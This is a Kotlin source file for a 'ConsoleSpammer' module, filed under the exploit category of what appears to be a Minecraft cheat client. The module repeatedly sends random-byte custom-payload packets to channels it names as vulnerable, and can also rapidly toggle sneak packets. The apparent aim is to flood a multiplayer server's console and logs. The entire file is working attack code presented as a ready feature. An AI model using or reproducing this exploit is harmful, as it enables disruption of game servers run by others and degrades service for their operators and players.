package net.aspw.client.features.module.impl.exploit

import io.netty.buffer.Unpooled
import net.aspw.client.event.EventTarget
import net.aspw.client.event.UpdateEvent
import net.aspw.client.event.WorldEvent
import net.aspw.client.features.module.Module
import net.aspw.client.features.module.ModuleCategory
import net.aspw.client.features.module.ModuleInfo
import net.aspw.client.utils.timer.MSTimer
import net.aspw.client.value.IntegerValue
import net.aspw.client.value.ListValue
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.C0BPacketEntityAction
import net.minecraft.network.play.client.C17PacketCustomPayload
import java.util.*
import kotlin.random.Random

@ModuleInfo(
    name = "ConsoleSpammer",
    spacedName = "Console Spammer",
    category = ModuleCategory.EXPLOIT
)
class ConsoleSpammer : Module() {

    private val modeValue = ListValue("Mode", arrayOf("Payload", "Sneak"), "Payload")
    private val delayValue = IntegerValue("Delay", 0, 0, 500, "ms")

    private val payload = PacketBuffer(Unpooled.buffer())
    private val vulnerableChannels = arrayOf("MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem")
    private val timer = MSTimer()

    init {
        val rawPayload = ByteArray(Random.nextInt(128))
        Random.nextBytes(rawPayload)
        payload.writeBytes(rawPayload)
    }

    @EventTarget
    fun onUpdate(event: UpdateEvent) {
        if (!timer.hasTimePassed(delayValue.get().toLong()))
            return

        when (modeValue.get().lowercase(Locale.getDefault())) {
            "payload" -> mc.netHandler.addToSendQueue(
                C17PacketCustomPayload(
                    vulnerableChannels[Random.nextInt(
                        vulnerableChannels.size
                    )], payload
                )
            )

            "sneak" -> {
                repeat(5) {
                    mc.netHandler.addToSendQueue(
                        C0BPacketEntityAction(
                            mc.thePlayer,
                            C0BPacketEntityAction.Action.STOP_SNEAKING
                        )
                    )
                    mc.netHandler.addToSendQueue(
                        C0BPacketEntityAction(
                            mc.thePlayer,
                            C0BPacketEntityAction.Action.START_SNEAKING
                        )
                    )
                }
            }
        }
    }

    @EventTarget
    fun onWorld(event: WorldEvent) {
        if (event.worldClient == null) {
            state = false
        }
    }

}